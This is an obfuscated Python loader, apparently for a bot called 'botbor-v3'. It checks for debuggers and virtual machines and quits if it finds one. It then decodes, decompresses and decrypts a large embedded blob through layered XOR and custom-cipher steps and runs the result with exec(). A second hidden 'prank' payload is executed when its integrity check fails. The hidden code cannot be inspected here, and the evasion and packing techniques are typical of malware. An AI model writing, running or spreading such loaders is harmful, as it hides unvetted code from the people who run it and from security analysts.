#!/usr/bin/env python3
import base64,zlib,hashlib,sys as _s,os as _o,time as _t,platform as _p

# Anti-debug
def _ad():
  if hasattr(_s,"gettrace") and _s.gettrace():_s.exit(1)
  if _p.system()=="Windows":
    try:
      import ctypes
      if ctypes.windll.kernel32.IsDebuggerPresent():_s.exit(1)
    except:pass
  try:
    if "PYDEVD" in str(_s.modules) or "pydevd" in str(_s.modules):_s.exit(1)
  except:pass
_ad()

# Anti-VM
def _av():
  vm_indicators=["vmware","virtualbox","qemu","xen","docker","hyperv"]
  try:
    bios="".join(open(p).read().lower() for p in ["/sys/class/dmi/id/sys_vendor","/sys/class/dmi/id/board_vendor"] if _o.path.exists(p))
    for v in vm_indicators:
      if v in bios:_s.exit(1)
  except:pass
_av()

# Decoder
def _D(x,k):
  kl=len(k)
  return bytes(x[i]^k[i%kl]for i in range(len(x)))

def _AES_D(data,key):
  box=list(range(256))
  ksum=sum(key)
  for i in range(256):
    j=(box[i]+key[i%len(key)]+ksum)%256
    box[i],box[j]=box[j],box[i]
  # Build reverse box
  rbox=[0]*256
  for i in range(256):rbox[box[i]]=i
  result=bytearray()
  prev=key[0]
  for b in data:
    orig=rbox[b]
    result.append(orig^prev)
    prev=b
  return bytes(result)

_K1=[167, 147, 75, 112, 130, 109, 87, 138, 56, 76, 33, 245, 211, 232, 25, 108, 180, 47, 122, 193, 94, 150, 13, 131]
_K2=[107, 57, 88, 50, 109, 80, 55, 118, 76, 52, 110, 81, 56, 119, 82, 49]
_K3=[131, 13, 150, 94, 193, 122, 47, 180, 108, 25, 232, 211, 245, 33, 76, 56, 138, 87, 109, 130, 112, 75, 147, 167]

_P="c-qZY-D=w~6u$RUoVXWBAaT>>t`N4cAGVf-()O}o6#Li~u_YtP>%!RmE>~DqD1<TCll2Mq2s?68*J&GAy3$oRa;&5CN#Bul^lde^3$3=tTx_HG0QuA;QuH0ybq^F169{C8pc8p2;50!2T4pE(f>9hb7zrVkUB=RQ`IOuop5;;*&{N$3Nk79g>;Qp<GIN{|Bk*$z-D>YTKt*bg`Wnny%^=lH;E`<-EJGL!pealfFx3cTMW&kV(kWM5m{$G23vfC6b~*d{RG)MA)^yKc^Fm&C16_Xqa`Ty;|9xv^yVs~y<gZ}Xw$CnBTdF0SKLB3>o3CrHP4?{G(OubL^R?_BW~_y4?W=D17yRWK%$MD&uexEi(<bl_wxi239K9OC{_D{Y4i1N-{RaI0@$2XRn$kPLVO&g@&4YysaFHIFPPw-k(9y!(dV(%OmO#k6C`z~xMNA{Gj0x}YsO_<G)Ig3|*H%}Fy{sf9>=;tUMdR^i^qv)vvkBw&ase**^LqllOqhWeGLt!r)083&$CzTQShgWhAxtrWkmZDz@&E;0OB0;J)JErM_||*W{dn<&FT1&W`<^bVEf@+Rr<?*7NQ!4j%AzzxQURw`wn`z!R=)$i4s>^xBH<b<a!(YUpHeZ9Feyp|>-UL&_B_w+0E%$n(mP5EoeYjuf$a*ziV;tzh<R&gC7^3Sdjz?3UC-#S)HYyHWn8cnFp4lRy0q5ROk<&Dt_fMnevNXC>kVOqK_a0`vdcX=>Gk`8+iaHuqefGWyW(6U+Vh^(rdw^Gy+Rw9@G!J%vD=0bX*tR{F(n`pc;3zZ_J$^_kl4{->_CjyCm>QpzB*oago#*q_>r4dukAP#5Z|})@O`WAT;I<qt@ysXAb+I|oj+<=!G-"

# Reconstruct data
_c0="c-jG!5^L>EhZdC#JyGTD_!K7>#G!d0>$4=h17t;Y$H}YxPt9_F0ZnRs?!g{DWOH1ylcIbaD2llUc2mH)Z%5v=H$r%kH{2LM1vF+>t55FT*rpd_uX+;oZQtw_Ja&KZfo>)Q3=taUbeWno=G=dAxhn<t;gE_<z)t~rvQj1*7(wd~x`iV$XfMn?<4OX=;~ejjdyJ7jG|_9Qhw;=-mYyMb*MMN{&brKVyL*gJQAY9ToAFbvIF>!Dp@o>o2oQ)JFb-jC$Qz=%LfHCP$A6EW@*Q3V;l$NvxS+APcT{)xQj39isU)IJP-Q7B35|6LA=N~K*@7~s77FG*gYuN1ceuVe@GmJ@vf=$`EdT2GIO1sNyay#wj11FrHkZnzP+LipaCeG|FH!cOc1@am4846;mrZ~ANpREE4;?87>qzf~D7yeS#TxDffYH`s7b_KN<_LnRRxT{9$rmH{!QiN#X7KHlf(A<i&^$dVCB}(MqV`Bb-g+*1;0=GRpV>S21}%TkQf3PP4@d1^3@&>%a})+Nj5sQ_y+G9MUGVK`q`yGQc|xS2MP=l;8*sfeI5a!2n<EmAuC1zZ7K4c8XJ~K0Mnf@#k-w0bMc|40GBV0Ng)efDwbw%;7qX#Cc2#h%WafsMV|6ChUu7J-D3Y!b_@&w7{_DI}&R7X>f4x+9W|s)wis54qz*v>T>tyffYwGB;i$#Y}Muu$8pkOUF%Vsb7%iOt#KLaU16mB+VCCluKJ_Umez-xDGla<F#3l8ykyGpjMmPI)?yUuCLY-8*e;lDzKc27oKUqP^^_Elc3juEAVa3g6N5i-Ma{LeSX7FJC<uJOLpjW|B~6r=Ho<4f^my#VIUMZWq~Z1>uJXfbvKz`usT*lC5zUvGeSgT;7i*szesTWLQg9adX|IV4Plc5QK%MgjLZCW06jDw%Zf#8eBX|Bqzxk~LLQmJvbT!6BXF>JI-`FwfG%BNYlnO1s83C2=*^N2(=eqQ%YUpph#TvEgyAG01^;NY!q}G^nC-VzEmA_sbU*`f>mUo-BZs+$UhpB%CvLJC9zcTPrii-#Se*Vm;3K{1=O*|5N=l5bgTe^#%)`k#!m)wrVYGt8|=)GJoQ+H3EVtUghz5N&n9zgV#D%i5s0zQFqNi!Y3LsZXWa9@cgXbID8z*N80Q~5<c^`Sxd8ov60E-ou-(YkR-{3QB0dNuRk{MvBrR6+&UQEn6F~SiMfP?zok;$V(5Uu&BP0rVOt?AhObf^fYaO-d0wuXkVW8LY6RY#XVt+B*QAM>#nw+$Gs$mOKn^&3<%;RUWk6~zhB=22_qej8ahB{UwvOi>2Z7cvfmjHWk@UHeFZMrT81ulODRv?@_oeW-(Afv6+@zjwoV3PiY}Vn^9!CPuzLZ045n#FoCJHHQ?w(Cy=>m1!Uo-WG*oD{#5i}}M>SW;LDCM%TYvTrT_gd6i9xk`kLblLbOrsOn+R1NMjvH24Z24q7yTtY3HXa0k-+5h2`>G=<e-szJd&(6Wf52O@9PQg@nWnGK^@Ys(d+U_9R0!W{EZXU~;lZm#LE4RO4Tf{J2kC_I=JUQ@&>pN`s?(N|a4x|5wVzEAv@PHZ29w)lbwZ{`b6g3Jy`lnAs`nc1H*hNJu^pq;+QJDTm@Nvi#~1_w>r;D{b~4T%0?y~@<kr>mmTCdmut%|^FyrjG>U0+>Frd4h%Kv`w9BCXw0!#!azt0i)ky>HsRkFVJMi4X5{i$+`6RWq$+OC3L)n(#;1?3hRtAZ21OM=#DT~=?fSo9!j%F&iPGl=*KhvKp+7wBC%)N|yc*RmKjso*sA@X^tGxALo{!SHUJ+3Xw(){mW?L9&cT0;-vD)&acepn#cXo=}fKjNC84IM|hSmE9Ua4P<TV*~Gl4<5}D75Ma+crVb*L8qk<~BY3(PrAn<1Z>oq;7hNKjeyb3&AN&lBKERnVDG<&zO)nHU3m0-mBK@_fLkQJO8%3Vy6r+R;I+;O{UUy52e)D!-if8}?;hc|uWMi&Yp+oQ?B>X=8V^0<_3}4qpO_<AS-0<l$68{24"
_c1="TCvI;T_XJ`wg!ilF8!g*dC!sU;26vjD-I;}ysyy&n{*<|=p%O;_I?AKpt4qtg#A<WZRm=G??pibbeAPlt4ghytRTg7BYP5NzGaV3lXN-2u-8L*7jUOKW%m^kG%YAV&U#?|azWndN$7e4`;b~FPR*$@ivH9T#~dYw@*|Do&JB`Xu)vfVIMr(`Hq^UiL?YrTJygPEVpX*{ftj_5B*0&kB3amHsjb8}<%!(4@6^z=(8=bR&lC=0xR0HKk7@-9p8a@R9Fm#tTc#k?H+M}Z7jIzk?L0G#SLG&G3~XR`%jDg|RMCEU7{x9R%L)}~g|JUZkUtWDaAY)#y+~<IV_$VZv{Nwa=2O>XncUS58DO@uZjMToTYgv33GbL~1HArT7G8~hyDX5y*-m{8k(sxk<FMP7$SP**lc4vSpDNS3alA`?7~+|MQKDa12yG9DE*DXb{h-~$#p|HD$F2|MGH8iM{kAi9JCDk0WIzdF7du1*JLbie;{*8&?X;-&+DBG$cg1Aa<z0(L=7NDi(9ASyeip*|N{a_2n@AK|>V!d$(j(bPqJKHv8fhs{N4A0FTVXgxj+wl>1}O#EMgi#grr#9;AQEEGRx%K!opJ!&4oj*_;o^!AuJOLpB?Uo_Mi)OFTlk3fZyqN!-;v~k(P4YQinPcK87D4>k4|kAlex;$5YIl}hJL!Yv5F;wC3LrB5~Dy2@)dM)pdbMVVPLB2WMSP7AqiKOM<Jm}n!!FF_b!_s%wd0Z|8w-kkJwg!8k`XvC6i5B(1%+5R2Y<Tc%geq`M0zH8+PctrGUH2l>mpZZLO_BD(Z9Ek)d&aB~vspJlIY6cjHptE<we${3HIgY;=G=2ewj#I0s@^-Xp>f3%Z(m_p;)KQdSQ6L)tBU<`EuD+j>K-RQiuhBrA6Coo)>Fm9k4)U>C<bXfUbNWl&-?bN%1(CIN#1=X<ODWaSY4WO?06XhDS0_zqn(FD@K05+qc<B3amH@Xj8@b$_*<7)vx#A5N{9tVr|JI3NGce$V8WQ~MYIO@WvW=%Q5;KHdQyU?odZhL>(M7G~s*E-YLS*RViSW64vpSH^wmc32f@r^Z7DkN@J3YTJ}%ILUi`inJg0KzT$68~Sy8@JCU3<B^Ektxqov$ua(l^B^K1a8bjjC>FZ!wk)$?;jfnUIBQDvya&GdZB5gD#`AkNie^5<;zy^4^~<B=eU|p*m+-is)8)nKTU$I5C^7H!`lsa>hnRLz0M&djJti;*yUXTKnt8x&2S3?|Z(bt4!UyTaohTAy$H!EyU%r7P^V7AIUN%HF`yI65?bMd?2o=S;BE>6d|JRsKT5-ajB4bPdBrq6`Y2ShUfMf6L;F{pURkKO@<~;Hl^#f2VAT(fHvHOs1H85*X4I&LVSn7ytISLkta5cJ1b}X{>`l+&bh#NfhX9G?mdJ0|O$<$sG1?e~ZDnJE`eyevwY+&^B#SghaJtKY46y*?<c3IemqxfS^TR_IiPpL;ktH&LVNUm<~7J+Zut`n#4S{`0bTq0o{Ef9x3#_X(KeCqhWYY+MG!+x^``@7m&mDVDFU-vSc+wMOjlr#wYPd;nBhJ=nCv?!O^{zqU+3A^}iDVA@*!Le6YT6WScyUXTKnt8xR-pRZ3<uNnz!tE+c%T214&t|5m+pl@As{kIw<DcX6EN}I2<@_fw$10*1Mc@O40Q5-spFZ7iWJ07}bl@F6Wc8@8jD-u=09##VPqHWBDNWbk?(2F244cNn`!EO|*}3>w`=oO;7P>op43dub1TQj5JoTm)D<34dXW#7Oh=HGC|0!_#ki<P5YZCH&GY2AF0h6fkZY5Cy3p*?3O@he)*XBh_aL7**uP*JVk0{ChMh6j*JV&ymK(~~eCLG9k?%=u;`tiFd#I3Ql6r<yqW>Mp_aaj{gENnCAAL*!U3%_o5%KYzMZ>pQxQ-R!dDMzk<t|Cq?l7Pt1L0qO!2x6VILZyy@{S6i7Sw1<f$RV@DOj~6^Q!C(R{$~Pqgch$TC7`D7txA$&9T2ncGBfDNgsSTn3~*r<$4V}g{5{*p"
_c2="ooaa~F)sVMqEpA*P*DnQ_mFwO_(!$XE{mQS(B{Zz7|jatjihP)GP-<!EK)+IYIu-7)I7k%FJ9hR`K9AkKs2H0?DKmzie^5<XWOu35^1U9cTTA?h30nqPjn_QFBe(n`;QTGjJ3R}zeB#Jy|YKqTc*r&n*4gm{%{(nbwTP!TJQE-VMj7n8?SzcE-vC^!D@OO1=@(1=#C8P{xS_dBmHEDZ&`=Jk7{}ohR&V(8suMc<6=HG0Ad()-H;@Ws$+OOWqs4X2VC$H)m9P$TBhKHv7ls+*rppBstFU%5X%S1h!xaaPI)#U?}vt7JKY0}b(?uno}^0tWl&-?bN%04Ard_LpL)b$gJBsC@L!293nl%QwD+0w(cowPx?LGXrmEJyS#FRSagrPC$n_V9{bd}n^z9eS)sUeX%L<_r`q>vd=lG9=&t}mXILP_V3dH2OD0Qtlt2v$Oa$8+h*Vhdb=d+Pj;@_QTtL%8<EryBrfqoA}l|qAf4EPO^I0E^pH2apY!hnW>)F=Lwe02V4e4$=9uXVP=ftT3t@HT#VnfdL+aNFoha|?jB+cXu92*^+B@s6P8(z}6sl`R#g)lSu(T>~~^xGW&R!C_(TH_G)d2{|;4{}<ultGa^AExW*F%ORJK1|$;yhTXvdEK0H!cR}d}v?e1#2lOLR9a{!>huuuE$K+m>`OoW$R$iw|8)@jF$nvx~PLz{q9jjrebY^Bi9XC5CzZ(Dmg7xQ*{h&%XKHdQyVEV${ZoOaTxi&dBnN6D`lBiH~B?bQ9&DXh#R=!+A2SebCF2HWx@Q_+x;nD#f;t}d8#H>=4(_5RCTZp)Bg{a;9x?PO;i+DI~F{7jc5oPXhvx1KI0dQOL|5yM9o-BZs+$Wx|np;5}Ubmq40dN7}1nyz%;DEK_3i(g1u^e*RGLNv+<rd`J88aqYstIH=nFE?V0A`NnzTB&j7~_-)iX6b?KTeC<lKm!>X1>I&m^SzlTiR&Dr0Q=pZ|(D@^i~5Kg5fVXN>CkLpkai$ePM?8msx}ox<5sbaFp=O*3Bz$J`~zfR_s)9wQ#Qg*Y%FvJB+oAmUuOqRMSVOK^rl&?h2IyGS^n5c8>Lv@~BE2MPY5=ITj8s|2r|J8J2Rqa{d>YD461gQb2fyes|&1On$aYEVj#E6NhZhQ6+X8hz)8Qmd`9bDV?)rY}sT(*I5fBITDxjeYwdC<U>EV_|I?sCaDm1{Il%z*r~sbv~bzz8_WJhDk|;Cmf08fIBFO|i=97e;AagmwWkI(9)q@0Q&Z6HVU1qq8)|8PLBnYmuUx^w;};5U06q+_j+~c9?=}m(_!ESBm{B9$H718+do#H85FfCN8T*4A0{2fl8Ds><UO1l4*&XnZM;C<6wMSNT^MN<U>w^dIAs2EGDz?B0>0CIu`qa2?7hBFNf^yJwBYXL&8ZS0xa8VLLr^3+Zjlzj#2zE>y?0_q5-wRz>`;OtK(VUrJo~Oii=--yz(4?!wON0~FB)7l!KE9JLRGrUw5}GS2QEt89d@!7(p#eO6KP>O4P(O@(nU%cgYgN*MOdpLR8~Sy8@GTM$`pbMWC^7JM?w(Iv%b-}9dE<Q>bqfF4XSjyn&uNNT5nZhYvJ7?BrI3n;Y1&RS$Dq&*ZwleyQjN5fT=d%+0?6EJ$vt-x>lTVzmo}ZD>9dZfH)+ShK2g0HG>PS+r_lY}vVC^Ja(5L`Bl{<em_6QoF9|aC{i*k)(vdzn=Da^56V+uyJb!vJBNR<6BPoy>1vN+_Q6T<qlE((Jv0lP+#2#`?@>-IT_QvP?<q4{O!&>QKFwmICn?TvjL+Fpg>$AM*n`kK5R>~6;l+&J7+r%7qiuNK}wvUD+?L=fMPe>ihqJ#>R^o0q(OPE?EvDdu3WcCVF?(9mfcbtZ9Qm?U$5(9rhKNaL{vCDsLLOCOwU)Zc*s-FqD8)t9wWKr@N=ra|qaq1tV@F=S(;M7jgXNx!W%z6(axKjgK$MOJFiaHN33hk={j^{i08#-n"
_E=_c0+_c1+_c2

# Main
try:
  _z=base64.b85decode(_E)
  _x=zlib.decompress(_z)
  _x=_D(_x,_K3)
  _x=_AES_D(_x,_K2)
  _x=_D(_x,_K1)
  _p=_x.decode()
  if _p[:4]=="#IB:":
    _ib=_p[4:28]
    _c=_p[29:]
    _ch=hashlib.sha256(("botbor-v3-secure-2024"+_c+"botbor-v3-secure-2024").encode()).hexdigest()[:16]
    _ch2=hashlib.md5((_c+"botbor-v3-secure-2024").encode()).hexdigest()[:8]
    if _ib!=_ch+_ch2:
      # TAMPERED - show prank
      _pz=base64.b85decode(_P);_pc=zlib.decompress(_pz).decode();exec(compile(_pc,"<botbor>","exec"));_s.exit(0)
  exec(compile(_p,"<botbor>","exec"))
except Exception as _e:
  # Only prank on integrity failure, show real error otherwise
  _em=str(_e).lower()
  if any(x in _em for x in ["decode","decompress","integrity","utf","codec"]):
    try:
      _pz=base64.b85decode(_P);_pc=zlib.decompress(_pz).decode();exec(compile(_pc,"<botbor>","exec"))
    except:print("\n  [FATAL] Source integrity FAILED. Contact @machine_id_bot");_s.exit(1)
  else:
    raise